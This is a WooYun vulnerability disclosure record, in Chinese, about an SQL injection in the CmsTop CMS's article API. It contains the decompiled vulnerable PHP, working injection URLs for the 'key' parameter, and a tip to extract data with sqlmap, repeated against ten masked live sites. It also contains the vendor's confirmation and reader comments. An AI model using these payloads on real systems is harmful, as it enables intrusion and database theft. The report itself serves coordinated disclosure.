{"id": 79820, "wybug_id": "wooyun-2015-0157276", "wybug_title": "cmstop通用SQL注入漏洞（附多个大型站点案例）", "wybug_corp": "CmsTop", "wybug_author": "路人甲", "wybug_date": "2015-12-01 11:25", "wybug_open_date": "2015-12-17 14:48", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-04：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2016-01-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-02-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-17：\t细节向公众公开  简要描述： cmstop SQL注入 详细说明：  0x01:介绍 目前已服务了300多家网站，客户遍及全国30个省市，覆盖报业、杂志、广电、网媒、政府、军队和高校等多个领域，其中代表性客户包括中纪委、新华社、人民日报社、CCTV、湖北广电、中青网、千龙网、财经网、参考消息、美国侨报、ELLE和瑞丽等0x02:分析问题出在api这个接口当中，cmstop为闭源系统，代码已经过zend加密，并且各模块进行严格封装。。。一次偶然的机会截获了一份代码，并解密，取出其中代码进行分析,发现一处SQL注入漏洞并发现可绕过限制对其算法进行破解（如授权限制）。。在apps\\article\\controller\\api\\article.php中\nclass controller_api_article extends api_controller_abstract{\t\t\t\tprivate $article = NULL;\t\t\t\tpublic function __construct( $app )\t\t\t\t{\t\t\t\t\t\t\t\t$FN_-2147483646( $app );\t\t\t\t\t\t\t\t$this->article = loader::model( \"admin/article\" );\t\t\t\t}\t\t\t\tpublic function get( )\t\t\t\t{\t\t\t\t\t\t\t\t$contentid = value( $_GET, \"contentid\", 0 );\t\t\t\t\t\t\t\tif ( !$contentid )\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t$result = array( \"state\" => FALSE, \"error\" => \"内容编号错误\" );\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\telse\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t$data = $this->article->get( $contentid, \"*\", \"show\" );\t\t\t\t\t\t\t\t\t\t\t\tif ( $data )\t\t\t\t\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tforeach ( array( \"status_old\", \"unpublished\", \"unpublishedby\", \"modified\", \"modifiedby\", \"checked\", \"checkedby\", \"locked\", \"lockedby\", \"noted\", \"notedby\", \"note\", \"workflow_step\", \"workflow_roleid\", \"placeid\", \"saveremoteimage\" ) as $field )\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tunset( $data[$field] );\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\t\t\t\t\t$result = array(\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\"state\" => TRUE,\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\"data\" => $data\t\t\t\t\t\t\t\t\t\t\t\t);\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\techo json_encode( $result );\t\t\t\t}\n跟踪\\public\\api\\abstract.php(初始化抽象类）\npublic function __construct( $app )\t\t\t\t{\t\t\t\t\t\t\t\t$FN_-2147483646( $app );\t\t\t\t\t\t\t\t$this->config = config::get( \"config\" );\t\t\t\t\t\t\t\t$this->setting = setting::get( $app->app );\t\t\t\t\t\t\t\t$this->system = setting::get( \"system\" );\t\t\t\t\t\t\t\t$this->json = factory::json( );\t\t\t\t\t\t\t\t$this->cache = factory::cache( );\t\t\t\t\t\t\t\t$this->auth_key = $this->get_key( );\t\t\t\t\t\t\t\tif ( !$this->auth_key )\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t$this->showmessage( \"KEY获取失败\" );\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\t$this->auth_sign = $this->get_sign( );\t\t\t\t\t\t\t\tif ( !$this->auth_sign )\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t$this->showmessage( \"SIGN签名获取失败\" );\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\t$this->auth_secret = $this->get_secret( $this->auth_key );\n跟踪$this->get_key( )\nprotected function get_key( )\t\t\t\t{\t\t\t\t\t\t\t\t$key = isset( $_GET['key'] ) ? $_GET['key'] : \"\";\t\t\t\t\t\t\t\tif ( !$key )\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t$key = isset( $_POST['key'] ) ? $_POST['key'] : \"\";\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\treturn $key;\t\t\t\t}\n直接get方式传入$this->auth_key 进入get_secret方法\nprotected function get_secret( $key )\t\t\t\t{\t\t\t\t\t\t\t\t$userinfo = $this->get_userinfo( $key );\t\t\t\t\t\t\t\treturn $userinfo['auth_secret'];\t\t\t\t}\n又进入get_userinfo\nprotected function get_userinfo( $key )\t\t\t\t{\t\t\t\t\t\t\t\t$_key = \"api_userinfo_\".$key;\t\t\t\t\t\t\t\t$userinfo = $this->cache->get( $_key );\t\t\t\t\t\t\t\tif ( !$userinfo )\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t$openauth = loader::model( \"admin/openauth\", \"system\" );\t\t\t\t\t\t\t\t\t\t\t\t$userinfo = $openauth->get( \"auth_key='{$key}' AND disabled=0\" );\t\t\t\t\t\t\t\t\t\t\t\tif ( !$userinfo )\t\t\t\t\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\treturn FALSE;\t\t\t\t\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\t\t\t\t\t$user_model = loader::model( \"admin/admin\", \"system\" );\t\t\t\t\t\t\t\t\t\t\t\t$a = $user_model->login( $userinfo['userid'] );\t\t\t\t\t\t\t\t\t\t\t\tif ( !$a )\t\t\t\t\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\treturn FALSE;\t\t\t\t\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\t\t\t\t\t$userinfo = array_merge( $userinfo, $a );\t\t\t\t\t\t\t\t\t\t\t\t$user_model = loader::model( \"member\", \"member\" );\t\t\t\t\t\t\t\t\t\t\t\t$a = $user_model->get( $userinfo['userid'], \"groupid\" );\t\t\t\t\t\t\t\t\t\t\t\tif ( !$a )\t\t\t\t\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\treturn FALSE;\t\t\t\t\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\t\t\t\t\t$userinfo = array_merge( $userinfo, $a );\t\t\t\t\t\t\t\t\t\t\t\t$this->cache->set( $_key, $userinfo );\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\treturn $userinfo;\n其中$key又进入了openauth类当中的get方法apps\\system\\model\\admin\\openauth.php继续父类model.php\npublic function get( $where = NULL, $fields = \"*\", $order = NULL )\t\t\t\t{\t\t\t\t\t\t\t\treturn $this->select( $where, $fields, $order, NULL, NULL, array( ), FALSE );\t\t\t\t}\n //$userinfo = $openauth->get( \"auth_key='{$key}' AND disabled=0\" );\t进入select查询，造成SQL注入。。。但是这是一个不是回显的注入漏洞，如何把他变成回显呢？例如，我们直接访问http://**.**.**.**/?app=article&controller=article&action=get&key=a%27%20and%201=1--+a&sign=3333&contentid=1和http://**.**.**.**/?app=article&controller=article&action=get&key=a%27%20and%201=12--+a&sign=3333&contentid=1没有任何区别。。。使用sqlmap也没法很好的判断（除非时间盲注）我们在后面加入or 1=1 使前面成立，将数据进行输出，造成回显，这样就达到了我们的目的了。。如http://**.**.**.**/?app=article&controller=article&action=get&key=a%27%20or%201=1%20and%201=1--+a&sign=3333&contentid=1\n\nhttp://**.**.**.**/?app=article&controller=article&action=get&key=a%27%20or%201=1%20and%201=21--+a&sign=3333&contentid=1\n\n并且可以直接用sqlmap跑出数据了。。。提供以下案例测试：**.**.**.**/?app=article&controller=article&action=get&key=a' or 1=1 and 1=21--+a&sign=3333&contentid=1**.**.**.**/?app=article&controller=article&action=get&key=a' or 1=1 and 1=21--+a&sign=3333&contentid=1**.**.**.**/?app=article&controller=article&action=get&key=a' or 1=1 and 1=21--+a&sign=3333&contentid=1**.**.**.**/?app=article&controller=article&action=get&key=a' or 1=1 and 1=21--+a&sign=3333&contentid=1**.**.**.**/?app=article&controller=article&action=get&key=a' or 1=1 and 1=21--+a&sign=3333&contentid=1**.**.**.**/?app=article&controller=article&action=get&key=a' or 1=1 and 1=21--+a&sign=3333&contentid=1**.**.**.**/?app=article&controller=article&action=get&key=a' or 1=1 and 1=21--+a&sign=3333&contentid=1**.**.**.**/?app=article&controller=article&action=get&key=a' or 1=1 and 1=21--+a&sign=3333&contentid=1**.**.**.**/?app=article&controller=article&action=get&key=a' or 1=1 and 1=21--+a&sign=3333&contentid=1**.**.**.**/?app=article&controller=article&action=get&key=a' or 1=1 and 1=21--+a&sign=3333&contentid=1   漏洞证明：  提供以下案例测试：**.**.**.**/?app=article&controller=article&action=get&key=a' or 1=1 and 1=21--+a&sign=3333&contentid=1**.**.**.**/?app=article&controller=article&action=get&key=a' or 1=1 and 1=21--+a&sign=3333&contentid=1**.**.**.**/?app=article&controller=article&action=get&key=a' or 1=1 and 1=21--+a&sign=3333&contentid=1**.**.**.**/?app=article&controller=article&action=get&key=a' or 1=1 and 1=21--+a&sign=3333&contentid=1**.**.**.**/?app=article&controller=article&action=get&key=a' or 1=1 and 1=21--+a&sign=3333&contentid=1**.**.**.**/?app=article&controller=article&action=get&key=a' or 1=1 and 1=21--+a&sign=3333&contentid=1**.**.**.**/?app=article&controller=article&action=get&key=a' or 1=1 and 1=21--+a&sign=3333&contentid=1**.**.**.**/?app=article&controller=article&action=get&key=a' or 1=1 and 1=21--+a&sign=3333&contentid=1**.**.**.**/?app=article&controller=article&action=get&key=a' or 1=1 and 1=21--+a&sign=3333&contentid=1**.**.**.**/?app=article&controller=article&action=get&key=a' or 1=1 and 1=21--+a&sign=3333&contentid=1   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-12-01 16:09 厂商回复： 非常感谢作者的辛苦付出，为CmsTop系统的安全做了贡献！代表CmsTop的广大用户感谢您。 最新状态： 2015-12-01：已修复  ", "replys": "漏洞评价：\n评价\n     2015-12-01 11:36 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:282 漏洞数:21        | 当我又回首一切,这个世界会好吗?)\t\t \n  三个白帽呢    \n     2015-12-01 11:40 |    \t\t狗狗侠  \t\t\t( 普通白帽子  |\t\t\t        Rank:518 漏洞数:58        | 我是狗狗侠)\t\t \n  @xsser  大哥。。。这是毕源的。。。⊙﹏⊙b汗    \n     2015-12-01 13:48 |    \t\tsaline \t\t\t( 普通白帽子  |\t\t\t        Rank:274 漏洞数:36        | Focus On Web Secur1ty)\t\t \n  这个是咋解密的.不是不开源的嘛~    \n     2015-12-08 10:02 |    \t\t沉默 \t\t\t( 路人 |\t\t\t        Rank:23 漏洞数:6        | 国内知名Web分布式实时计算系统架构师，分...)\t\t \n  CMSTOP虽然用了PDO，但是他没用占位符，典型的找黑设计    \n     2015-12-08 10:11 |    \t\tD＆G \t\t\t( 普通白帽子  |\t\t\t        Rank:561 漏洞数:110        | going)\t\t \n  @沉默 有源码？求    \n     2015-12-08 12:29 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:223 漏洞数:28        | 开发真是日了狗了)\t\t \n  @沉默 大牛，求源码    \n     2015-12-08 19:54 |    \t\tXser \t\t\t( 普通白帽子  |\t\t\t        Rank:365 漏洞数:83        | JDSec)\t\t \n  @沉默 求源码    \n     2015-12-08 22:37 |    \t\tonpu \t\t\t( 普通白帽子  |\t\t\t        Rank:167 漏洞数:37        )\t\t \n  坐等公开    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}